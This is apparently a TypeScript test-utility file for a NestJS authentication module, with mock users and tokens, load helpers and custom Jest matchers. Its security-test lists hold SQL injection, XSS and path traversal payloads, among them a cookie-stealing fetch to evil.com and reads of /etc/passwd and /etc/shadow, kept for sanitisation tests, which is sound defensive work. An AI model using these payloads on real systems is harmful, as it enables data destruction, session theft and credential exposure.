import { Test, TestingModule } from '@nestjs/testing';
import { JwtService } from '@nestjs/jwt';
import { ConfigService } from '@nestjs/config';
import { faker } from '@faker-js/faker';
import { JwtPayload, TokenPair } from '@modules/auth/domain/auth.types';
import { Password } from '@modules/auth/domain/value-objects/password.value-object';
import { UserEntity } from '@modules/user/domain/entities/user.entity';
import { RefreshTokenEntity } from '@modules/auth/domain/entities/refresh-token.entity';
import { AuthAuditLogEntity } from '@modules/auth/domain/entities/auth-audit-log.entity';

/**
 * Utility class for authentication testing
 * Provides helper methods, mock data, and test fixtures
 */
export class AuthTestUtils {
  
  /**
   * Generate a mock user for testing
   */
  static generateMockUser(overrides: Partial<any> = {}): any {
    return {
      id: faker.datatype.uuid(),
      email: faker.internet.email().toLowerCase(),
      password: 'HashedPassword123!',
      isActive: true,
      isEmailVerified: true,
      loginAttempts: 0,
      lockedUntil: null,
      lastLoginAt: null,
      roles: ['user'],
      permissions: ['user:read-own'],
      createdAt: new Date(),
      updatedAt: new Date(),
      getProps: function() {
        return {
          email: this.email,
          password: this.password,
          isActive: this.isActive,
          isEmailVerified: this.isEmailVerified,
          loginAttempts: this.loginAttempts,
          lockedUntil: this.lockedUntil,
          lastLoginAt: this.lastLoginAt,
        };
      },
      updateAuthProps: jest.fn(),
      ...overrides,
    };
  }

  /**
   * Generate a mock JWT payload
   */
  static generateMockJwtPayload(overrides: Partial<JwtPayload> = {}): JwtPayload {
    const now = Math.floor(Date.now() / 1000);
    return {
      sub: faker.datatype.uuid(),
      email: faker.internet.email().toLowerCase(),
      roles: ['user'],
      permissions: ['user:read-own'],
      tokenType: 'access',
      iat: now,
      exp: now + 900, // 15 minutes
      ...overrides,
    };
  }

  /**
   * Generate a mock token pair
   */
  static generateMockTokenPair(overrides: Partial<TokenPair> = {}): TokenPair {
    return {
      accessToken: this.generateMockJwtToken(),
      refreshToken: this.generateMockJwtToken(),
      expiresIn: 900,
      tokenType: 'Bearer',
      ...overrides,
    };
  }

  /**
   * Generate a mock JWT token string
   */
  static generateMockJwtToken(payload?: Partial<JwtPayload>): string {
    const header = Buffer.from(JSON.stringify({ alg: 'HS256', typ: 'JWT' })).toString('base64');
    const mockPayload = this.generateMockJwtPayload(payload);
    const payloadBase64 = Buffer.from(JSON.stringify(mockPayload)).toString('base64');
    const signature = faker.datatype.hexadecimal({ length: 64 });
    
    return `${header}.${payloadBase64}.${signature}`;
  }

  /**
   * Generate valid registration data
   */
  static generateValidRegistrationData(overrides: Partial<any> = {}): any {
    const password = 'ValidPassword123!';
    return {
      email: faker.internet.email().toLowerCase(),
      password,
      confirmPassword: password,
      address: {
        street: faker.address.streetAddress(),
        postalCode: faker.address.zipCode(),
        country: faker.address.country(),
      },
      ...overrides,
    };
  }

  /**
   * Generate valid login data
   */
  static generateValidLoginData(overrides: Partial<any> = {}): any {
    return {
      email: faker.internet.email().toLowerCase(),
      password: 'ValidPassword123!',
      ipAddress: faker.internet.ip(),
      userAgent: faker.internet.userAgent(),
      ...overrides,
    };
  }

  /**
   * Generate mock password value object
   */
  static generateMockPassword(overrides: Partial<any> = {}): any {
    return {
      value: 'ValidPassword123!',
      isHashed: false,
      hash: jest.fn().mockResolvedValue({ value: 'hashed-password' }),
      validate: jest.fn(),
      ...overrides,
    };
  }

  /**
   * Generate mock refresh token entity
   */
  static generateMockRefreshToken(overrides: Partial<any> = {}): any {
    return {
      id: faker.datatype.uuid(),
      token: this.generateMockJwtToken(),
      userId: faker.datatype.uuid(),
      isActive: true,
      expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000), // 30 days
      createdByIp: faker.internet.ip(),
      userAgent: faker.internet.userAgent(),
      createdAt: new Date(),
      revoke: jest.fn(),
      isExpired: jest.fn().mockReturnValue(false),
      ...overrides,
    };
  }

  /**
   * Generate mock audit log entry
   */
  static generateMockAuditLog(overrides: Partial<any> = {}): any {
    return {
      id: faker.datatype.uuid(),
      userId: faker.datatype.uuid(),
      action: 'LOGIN_SUCCESS',
      details: {},
      ipAddress: faker.internet.ip(),
      userAgent: faker.internet.userAgent(),
      success: true,
      createdAt: new Date(),
      getProps: function() {
        return {
          userId: this.userId,
          action: this.action,
          details: this.details,
          ipAddress: this.ipAddress,
          userAgent: this.userAgent,
          success: this.success,
        };
      },
      ...overrides,
    };
  }

  /**
   * Create a mock testing module with authentication services
   */
  static async createAuthTestingModule(overrides: any = {}): Promise<TestingModule> {
    return Test.createTestingModule({
      providers: [
        {
          provide: JwtService,
          useValue: {
            sign: jest.fn().mockReturnValue('mock-token'),
            signAsync: jest.fn().mockResolvedValue('mock-token'),
            verify: jest.fn().mockReturnValue({ sub: 'user-123' }),
            verifyAsync: jest.fn().mockResolvedValue({ sub: 'user-123' }),
            decode: jest.fn().mockReturnValue({ sub: 'user-123' }),
          },
        },
        {
          provide: ConfigService,
          useValue: {
            get: jest.fn((key: string) => {
              const config: Record<string, any> = {
                JWT_ACCESS_TOKEN_SECRET: 'test-access-secret',
                JWT_REFRESH_TOKEN_SECRET: 'test-refresh-secret',
                NODE_ENV: 'test',
                ...overrides.config,
              };
              return config[key];
            }),
            getOrThrow: jest.fn((key: string) => {
              const config: Record<string, any> = {
                JWT_ACCESS_TOKEN_SECRET: 'test-access-secret',
                JWT_REFRESH_TOKEN_SECRET: 'test-refresh-secret',
                ...overrides.config,
              };
              return config[key];
            }),
          },
        },
        ...overrides.providers || [],
      ],
      ...overrides,
    }).compile();
  }

  /**
   * Common SQL injection attack patterns for testing
   */
  static getSqlInjectionPatterns(): string[] {
    return [
      "'; DROP TABLE users; --",
      "' OR '1'='1",
      "' UNION SELECT * FROM passwords --",
      "'; EXEC xp_cmdshell('format c:'); --",
      "admin'--",
      "admin'/*",
      "' OR 1=1 --",
      "' OR 'x'='x",
      "1' AND 1=1 --",
      "1' WAITFOR DELAY '00:00:10'--",
      "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
      "' OR EXISTS(SELECT * FROM users WHERE email='admin@example.com'); --"
    ];
  }

  /**
   * Common XSS attack patterns for testing
   */
  static getXssPatterns(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '<img src="x" onerror="alert(\'XSS\')">',
      '<svg onload="alert(1)">',
      'javascript:alert("XSS")',
      '<iframe src="javascript:alert(\'XSS\')"></iframe>',
      '<body onload="alert(\'XSS\')">',
      '<input type="text" onfocus="alert(\'XSS\')">',
      '<a href="javascript:void(0)" onclick="alert(\'XSS\')">Click me</a>',
      '<div style="background: url(javascript:alert(\'XSS\'))">',
      '"><script>alert("XSS")</script>',
      '<script>document.location="http://evil.com"</script>',
      '<img src="x" onerror="fetch(\'http://evil.com?cookie=\'+document.cookie)">'
    ];
  }

  /**
   * Common path traversal patterns for testing
   */
  static getPathTraversalPatterns(): string[] {
    return [
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      './config/../../../etc/shadow',
      'normal/path/../../secret.txt',
      '....//....//....//etc/passwd',
      '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
      '..%252f..%252f..%252fetc%252fpasswd',
      '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
      '..%5c..%5c..%5cwindows%5csystem32%5c',
      '/var/log/../../../etc/passwd'
    ];
  }

  /**
   * Generate test data for rate limiting scenarios
   */
  static generateRateLimitTestData(requestCount: number = 10): Array<{ ip: string; timestamp: number }> {
    const baseTime = Date.now();
    return Array.from({ length: requestCount }, (_, i) => ({
      ip: faker.internet.ip(),
      timestamp: baseTime + (i * 1000), // 1 second apart
    }));
  }

  /**
   * Mock repository methods for authentication testing
   */
  static getMockRepositoryMethods() {
    return {
      findByEmail: jest.fn(),
      findOneById: jest.fn(),
      findById: jest.fn(),
      insert: jest.fn(),
      update: jest.fn(),
      delete: jest.fn(),
      findByToken: jest.fn(),
      revokeToken: jest.fn(),
      revokeAllUserTokens: jest.fn(),
      findByName: jest.fn(),
      assignRoleToUser: jest.fn(),
      getUserRoles: jest.fn(),
      getUserPermissions: jest.fn(),
    };
  }

  /**
   * Mock service methods for authentication testing
   */
  static getMockServiceMethods() {
    return {
      // JWT Service
      generateTokenPair: jest.fn(),
      generateAccessToken: jest.fn(),
      generateRefreshToken: jest.fn(),
      verifyAccessToken: jest.fn(),
      verifyRefreshToken: jest.fn(),
      decodeToken: jest.fn(),
      isTokenExpired: jest.fn(),

      // Password Service
      hash: jest.fn(),
      compare: jest.fn(),
      validate: jest.fn(),
      generateSecureToken: jest.fn(),
      generateResetToken: jest.fn(),

      // Security Service
      sanitizeHtml: jest.fn(),
      sanitizeString: jest.fn(),
      sanitizeSqlInput: jest.fn(),
      validateEmailFormat: jest.fn(),
      sanitizePathTraversal: jest.fn(),
      validateRequestSecurity: jest.fn(),
      applySecurityMiddleware: jest.fn(),
    };
  }

  /**
   * Create mock execution context for guard testing
   */
  static createMockExecutionContext(request: any = {}): any {
    const mockRequest = {
      headers: {},
      user: null,
      ip: faker.internet.ip(),
      method: 'GET',
      url: '/test',
      get: jest.fn(),
      ...request,
    };

    return {
      switchToHttp: jest.fn().mockReturnValue({
        getRequest: jest.fn().mockReturnValue(mockRequest),
        getResponse: jest.fn().mockReturnValue({
          setHeader: jest.fn(),
          header: jest.fn(),
        }),
      }),
      getHandler: jest.fn(),
      getClass: jest.fn(),
      getArgs: jest.fn(),
      getArgByIndex: jest.fn(),
      switchToRpc: jest.fn(),
      switchToWs: jest.fn(),
      getType: jest.fn(),
    };
  }

  /**
   * Generate test users with different roles and permissions
   */
  static generateTestUsers(): Array<any> {
    return [
      // Regular user
      this.generateMockUser({
        email: 'user@example.com',
        roles: ['user'],
        permissions: ['user:read-own', 'user:update-own'],
      }),
      // Admin user
      this.generateMockUser({
        email: 'admin@example.com',
        roles: ['admin', 'user'],
        permissions: ['admin:manage', 'user:read-all', 'user:update-all', 'user:delete'],
      }),
      // Editor user
      this.generateMockUser({
        email: 'editor@example.com',
        roles: ['editor', 'user'],
        permissions: ['content:create', 'content:update', 'content:read', 'user:read-own'],
      }),
      // Moderator user
      this.generateMockUser({
        email: 'moderator@example.com',
        roles: ['moderator', 'user'],
        permissions: ['content:moderate', 'user:suspend', 'user:read-all'],
      }),
      // Locked user
      this.generateMockUser({
        email: 'locked@example.com',
        roles: ['user'],
        permissions: ['user:read-own'],
        lockedUntil: new Date(Date.now() + 30 * 60 * 1000), // 30 minutes from now
        loginAttempts: 5,
      }),
      // Inactive user
      this.generateMockUser({
        email: 'inactive@example.com',
        roles: ['user'],
        permissions: ['user:read-own'],
        isActive: false,
      }),
      // Unverified user
      this.generateMockUser({
        email: 'unverified@example.com',
        roles: ['user'],
        permissions: ['user:read-own'],
        isEmailVerified: false,
      }),
    ];
  }

  /**
   * Performance test helper - measure execution time
   */
  static async measureExecutionTime<T>(
    operation: () => Promise<T>
  ): Promise<{ result: T; duration: number }> {
    const start = performance.now();
    const result = await operation();
    const end = performance.now();
    return { result, duration: end - start };
  }

  /**
   * Performance test helper - generate load
   */
  static async generateLoad(
    operation: () => Promise<any>,
    concurrency: number,
    iterations: number
  ): Promise<{ results: any[]; totalTime: number; successRate: number }> {
    const start = performance.now();
    
    const batches = [];
    for (let i = 0; i < iterations; i += concurrency) {
      const batchSize = Math.min(concurrency, iterations - i);
      const batch = Array(batchSize).fill(0).map(() => operation());
      batches.push(Promise.all(batch));
    }
    
    const allResults = await Promise.all(batches);
    const flatResults = allResults.flat();
    const end = performance.now();
    
    const successCount = flatResults.filter(result => 
      result && (result.status === 200 || result.success === true)
    ).length;
    
    return {
      results: flatResults,
      totalTime: end - start,
      successRate: successCount / flatResults.length,
    };
  }

  /**
   * Security test helper - validate no sensitive data in logs
   */
  static validateLogSecurity(logEntries: any[]): { isSecure: boolean; violations: string[] } {
    const sensitivePatterns = [
      /password/i,
      /secret/i,
      /key/i,
      /token/i,
      /hash/i,
      /bearer\s+[a-zA-Z0-9]/i,
      /authorization:\s*[a-zA-Z0-9]/i,
    ];

    const violations: string[] = [];

    logEntries.forEach((entry, index) => {
      const logString = JSON.stringify(entry);
      sensitivePatterns.forEach(pattern => {
        if (pattern.test(logString)) {
          violations.push(`Log entry ${index} contains sensitive data matching ${pattern}`);
        }
      });
    });

    return {
      isSecure: violations.length === 0,
      violations,
    };
  }

  /**
   * Create test database transaction helper
   */
  static createMockDatabaseTransaction() {
    return {
      query: jest.fn(),
      transaction: jest.fn(),
      connect: jest.fn(),
      release: jest.fn(),
      commit: jest.fn(),
      rollback: jest.fn(),
    };
  }

  /**
   * Generate mock environment configuration for tests
   */
  static getMockEnvironmentConfig(overrides: Record<string, any> = {}): Record<string, any> {
    return {
      NODE_ENV: 'test',
      JWT_ACCESS_TOKEN_SECRET: 'test-access-secret-key-that-is-long-enough',
      JWT_REFRESH_TOKEN_SECRET: 'test-refresh-secret-key-that-is-long-enough',
      DATABASE_URL: 'postgresql://test:test@localhost:5432/test_db',
      CORS_ORIGIN: 'http://localhost:3000',
      CORS_CREDENTIALS: 'true',
      CSP_ENABLED: 'true',
      HSTS_MAX_AGE: '31536000',
      RATE_LIMIT_TTL: '60000',
      RATE_LIMIT_MAX: '100',
      BCRYPT_ROUNDS: '10',
      ...overrides,
    };
  }

  /**
   * Cleanup helper for tests
   */
  static async cleanupTestData(repositories: any[]): Promise<void> {
    for (const repo of repositories) {
      if (repo && typeof repo.deleteTestData === 'function') {
        await repo.deleteTestData();
      }
    }
  }
}

/**
 * Test data factory for creating consistent test scenarios
 */
export class AuthTestDataFactory {
  
  /**
   * Create a complete authentication test scenario
   */
  static createAuthScenario(scenarioType: 'success' | 'failure' | 'edge-case' = 'success') {
    const baseUser = AuthTestUtils.generateMockUser();
    const baseLogin = AuthTestUtils.generateValidLoginData({ email: baseUser.email });
    
    switch (scenarioType) {
      case 'success':
        return {
          user: baseUser,
          loginData: baseLogin,
          expectedResult: 'success',
          expectation: expect.objectContaining({
            accessToken: expect.any(String),
            refreshToken: expect.any(String),
          }),
        };
        
      case 'failure':
        return {
          user: AuthTestUtils.generateMockUser({ 
            isActive: false,
            loginAttempts: 5,
            lockedUntil: new Date(Date.now() + 30 * 60 * 1000),
          }),
          loginData: baseLogin,
          expectedResult: 'failure',
          expectation: expect.any(Error),
        };
        
      case 'edge-case':
        return {
          user: AuthTestUtils.generateMockUser({ 
            email: 'test+tag@example.com',
            password: null,
          }),
          loginData: AuthTestUtils.generateValidLoginData({
            email: 'TEST+TAG@EXAMPLE.COM', // Case sensitivity test
            password: '',
          }),
          expectedResult: 'edge-case',
          expectation: expect.any(Error),
        };
        
      default:
        throw new Error(`Unknown scenario type: ${scenarioType}`);
    }
  }

  /**
   * Create security test scenarios
   */
  static createSecurityScenarios() {
    return {
      sqlInjection: {
        inputs: AuthTestUtils.getSqlInjectionPatterns(),
        expectedBehavior: 'sanitized',
      },
      xss: {
        inputs: AuthTestUtils.getXssPatterns(),
        expectedBehavior: 'sanitized',
      },
      pathTraversal: {
        inputs: AuthTestUtils.getPathTraversalPatterns(),
        expectedBehavior: 'blocked',
      },
    };
  }

  /**
   * Create performance test scenarios
   */
  static createPerformanceScenarios() {
    return {
      lowLoad: { concurrency: 10, iterations: 100 },
      mediumLoad: { concurrency: 50, iterations: 500 },
      highLoad: { concurrency: 100, iterations: 1000 },
      burstLoad: { concurrency: 200, iterations: 200 },
    };
  }
}

/**
 * Custom Jest matchers for authentication testing
 */
export const customMatchers = {
  /**
   * Check if a JWT token is valid format
   */
  toBeValidJwtToken(received: string) {
    const jwtRegex = /^[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+\.[A-Za-z0-9-_]+$/;
    const pass = jwtRegex.test(received);
    
    if (pass) {
      return {
        message: () => `expected ${received} not to be a valid JWT token`,
        pass: true,
      };
    } else {
      return {
        message: () => `expected ${received} to be a valid JWT token`,
        pass: false,
      };
    }
  },

  /**
   * Check if response contains no sensitive information
   */
  toNotContainSensitiveData(received: any) {
    const sensitiveFields = ['password', 'secret', 'key', 'hash', 'salt'];
    const receivedString = JSON.stringify(received);
    
    for (const field of sensitiveFields) {
      if (receivedString.toLowerCase().includes(field.toLowerCase())) {
        return {
          message: () => `expected response not to contain sensitive field '${field}'`,
          pass: false,
        };
      }
    }
    
    return {
      message: () => `expected response to contain sensitive data but it doesn't`,
      pass: true,
    };
  },

  /**
   * Check if error message is user-safe
   */
  toBeUserSafeError(received: Error) {
    const dangerousPatterns = [
      /stack trace/i,
      /internal server/i,
      /database/i,
      /query/i,
      /file not found/i,
      /permission denied/i,
    ];
    
    const message = received.message;
    
    for (const pattern of dangerousPatterns) {
      if (pattern.test(message)) {
        return {
          message: () => `expected error message '${message}' to be user-safe`,
          pass: false,
        };
      }
    }
    
    return {
      message: () => `expected error message '${message}' not to be user-safe`,
      pass: true,
    };
  },
};

// Extend Jest matchers
declare global {
  namespace jest {
    interface Matchers<R> {
      toBeValidJwtToken(): R;
      toNotContainSensitiveData(): R;
      toBeUserSafeError(): R;
    }
  }
}

// Apply custom matchers if Jest is available
if (typeof expect !== 'undefined') {
  expect.extend(customMatchers);
}